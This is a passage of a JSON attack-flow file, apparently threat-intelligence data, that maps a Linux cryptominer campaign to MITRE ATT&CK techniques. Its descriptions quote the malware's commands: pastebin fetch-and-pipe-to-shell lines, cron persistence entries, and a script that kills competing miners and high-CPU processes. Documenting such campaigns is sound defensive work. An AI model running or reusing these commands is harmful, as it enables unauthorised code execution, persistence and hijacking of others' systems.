e--aaa05955-28cd-5999-bdf2-5494a06adfb4","150":"instance--793b72b8-73ab-5fa5-b19c-3090f2bdb51c","180":"instance--aefe37e2-a46d-5433-be7e-a87bb05adbd3","210":"instance--d7951e2a-d76d-57c0-9249-4621385916b3","240":"instance--1e1688b5-ab47-58fe-ac67-231946bfde61","270":"instance--cceddebd-5c11-52ea-81b8-74a62db790cd","30":"instance--57171294-c327-5025-bd1a-bd46656c1455","300":"instance--cc9f9e4c-7e7a-5c30-9b9a-48f6fe675834","330":"instance--e7d2d3f8-e543-5f7d-93a8-5965bf500cfd","60":"instance--a5228d3a-7857-5cff-ab44-690a28448aa9","90":"instance--6ba49f25-1b6b-549b-8266-3948111fd36f"},"id":"action","instance":"attack-action--001-check-version","properties":[["name","Check latest version on Pastebin"],["description","The URL \u201chttps://pastebin[.]com/HWBVXK6H\u201d is used to check for the latest version of the malware."],["confidence",0.0],["ttp",{"tactic":"TA0011","technique":"T1071.001"}]]},{"anchors":{"0":"instance--f6c1938e-5902-5081-ba93-edb409fa1bff","120":"instance--70629cd7-16fc-55b4-b063-805dd651407d","150":"instance--e9027944-64e6-524d-8481-ecde2d62da29","180":"instance--33a153a6-664b-58e8-bb53-5ab77a374ba0","210":"instance--ba8ef2c2-3799-5fa7-8bbb-4a99009527cd","240":"instance--71d521c9-db8a-55a4-833b-b89a7966e776","270":"instance--b2fbe4ef-c0f6-5636-8e7e-895ff50ff8a9","30":"instance--dcb4226e-0bf0-576e-9016-be7eacfa64c3","300":"instance--fea3eccc-3811-5fca-9263-4a2f1cc1da05","330":"instance--66d1bfa4-9d13-5b8a-a253-a2310d9488f4","60":"instance--f4306879-2898-5715-920b-da975a7670c9","90":"instance--50e62de8-f56c-5ab9-b6d4-73af3c508acc"},"id":"action","instance":"attack-action--002-fetch-redirect-paste","properties":[["name","Fetch redirect paste"],["description","If a new version is available, the malware reaches out to \u201chttps://pastebin[.]com/yPRSa0ki\u201d. The paste shown below serves as a redirect to the actual setup stript.\n\n (curl -fsSL https://pastebin.com/raw/D8E71JBJ||wget -q -O- https://pastebin.com/raw/D8E71JBJ)|sed 's/ //'|sh"],["confidence",0.0],["ttp",{"tactic":"TA0011","technique":"T1071.001"}]]},{"anchors":{"0":"instance--21ca6d94-e85c-58b9-bc98-78adcd205570","120":"instance--0dcc10c7-381d-515f-8c9d-a92a9946b09b","150":"instance--202ae2f6-edd9-5223-bf3d-78a455a59282","180":"instance--e03a34cd-6ec1-5a99-9f34-279f1f495a64","210":"instance--53e3bb1b-7d0b-5255-bd6d-26a479a5b5df","240":"instance--496cfd97-bb7b-527b-9aec-b633e5d2a8b2","270":"instance--723faa1a-ceb7-5a96-b647-b016e8a0b215","30":"instance--3d705efa-22f0-506d-8508-67c1ab29801c","300":"instance--244b17bc-f8c7-5900-a043-e174d3915288","330":"instance--a2ac5e3c-47f4-5166-9a3b-949a0bd3de2a","60":"instance--b54036ab-43cb-59d1-b2eb-ae6b0cecf2ad","90":"instance--92e36a70-3941-520a-8daa-7ef916d3c274"},"id":"action","instance":"attack-action--003-execute-setup-script","properties":[["name","Execute setup script via shell"],["description","(curl -fsSL https://pastebin.com/raw/D8E71JBJ||wget -q -O- https://pastebin.com/raw/D8E71JBJ)|sed 's/ //'|sh"],["confidence",0.0],["ttp",{"tactic":"TA0002","technique":"T1059.004"}]]},{"anchors":{"0":"instance--8f9eeb0e-2fbb-5666-b23a-7d49b177e660","120":"instance--76cd567d-cac8-57aa-a343-7701ca02028e","150":"instance--d7152970-c360-5b4d-b3ea-627496f01965","180":"instance--f727aeff-45cf-5180-9adb-bc84d0dec6f4","210":"instance--14290424-2e3b-5f47-83b0-33aa21c2e4c1","240":"instance--66a326f7-64e2-5680-9c38-a2ea483f9650","270":"instance--01de0ca9-261c-5eba-b257-83d58c93e7b7","30":"instance--623ca9f9-9665-55b1-83b3-dedb388daa45","300":"instance--8100d74e-ba66-5d0d-a9b8-f66764dd262b","330":"instance--67ebdebc-062d-5ecc-a905-2727009d0416","60":"instance--18f529cc-524b-5dc9-ae7e-b2b9202987b5","90":"instance--87de65c2-ad9b-5dc4-889c-d465819ef38c"},"id":"action","instance":"attack-action--004-create-cron-job","properties":[["name","Create cron persistence"],["description","Persistence is added through Cron by executing echo \"*/10 * * * * (curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh\" | crontab - and by adding \u201c*/15 * * * * (curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh\u201d to  \u201c/var/spool/cron/crontabs/root\u201d"],["confidence",0.0],["ttp",{"tactic":"TA0003","technique":"T1053.003"}]]},{"anchors":{"0":"instance--49fa68fd-5b27-5766-930c-99638b07a76a","120":"instance--d9486ee5-5fcd-537b-8476-57bde4ed8654","150":"instance--8427dd4c-9c39-5a6d-9b3f-a407bcc42ffc","180":"instance--c0ab9a41-e44b-512e-927c-30e6f92439cf","210":"instance--f03b742d-aea6-5e9b-9bde-68dcde70a7d1","240":"instance--2a1b155f-cc52-5412-9258-0d02921a6623","270":"instance--6685fed2-cb78-5172-9fa1-9e72016fbfb7","30":"instance--62f580e3-0e6e-53df-b94a-702fee1830ec","300":"instance--73b8876f-8ae9-53ac-8d61-e291dfe123b2","330":"instance--cfb9ed79-1a2f-5b38-af1a-faf423283465","60":"instance--e07ced7c-d32a-51b7-83cf-97cb269f34d1","90":"instance--504a0b6c-f28d-5384-a82e-290a84758485"},"id":"action","instance":"attack-action--005-kill-competing-miners","properties":[["name","Kill competing miner processes"],["description","The setup script in paste D8E71JBJ, shown below, kills other mining malware and downloads and executes the threat actors\u2019 malware instead. It will also try to use known SSH hosts and the SSH key on the machine to spread latterly.\n\nexport PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin echo \"*/10 * * * * (curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh\" | crontab - mkdir -p /tmp chmod 1777 /tmp ps -ef|grep -v grep|grep hwlh3wlh44lh|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep Circle_MI|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep get.bi-chi.com|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep hashvault.pro|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep nanopool.org|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep /usr/bin/.sshd|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep /usr/bin/bsd-port|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep \"xmr\"|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep \"xig\"|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep \"ddgs\"|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep \"qW3xT\"|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep \"wnTKYg\"|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep \"t00ls.ru\"|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep \"sustes\"|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep \"thisxxs\"|awk '{print $2}' | xargs kill -9 ps -ef|grep -v grep|grep \"hashfish\"|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep \"kworkerds\"|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep \"watchdog\"|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep \"/tmp/devtool\"|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep \"systemctI\"|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep \"watchdogs\"|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep \"ksoftirqds\"|awk '{print $2}'|xargs kill -9 ps -ef|grep -v grep|grep \"suolbcc\"|awk '{print $2}'|xargs kill -9 ps aux|grep -v grep|grep -v kintegrityds|awk '{if($3>=80.0) print $2}'|xargs kill -9"],["confidence",0.0],["ttp",{"tactic":"TA0040","technique":"T1489"}]]},{"anchors":{"0":"instance--458debab-b2b5-5be3-8ee6-7efe3209863e","120":"instance--1a84e753-c602-50a1-89e4-8d1e6be77e94","150":"instance--df00c8b0-71fd-57eb-afb4-b81c3f0b6f17","180":"instance--443ef438-3c02-5fe0-b199-34d8a8a0c881","210":"instance--54cfba5a-00e5-58ac-9c87-3a8621869334","240":"instance--3ca1530e-1c79-5d63-9a7d-795293a9d3a0","270":"instance--e983c812-f166-5728-afc9-b0008111b432","30":"instance--9e117024-ed06-5726-a2a3-4c0b20fb1a21","300":"instance--11ef6b9e-6755-596a-9d7b-3f6c37748109","330":"instance--e65ae166-42bd-56f6-863a-de156ab292d0","60":"instance--2502529f-c3de-56b0-965a-9e63ac956d1d","90":"instance--5d0cb53e-ee1d-5237-9799-30880f1d8a70"},"id":"action","instance":"attack-actio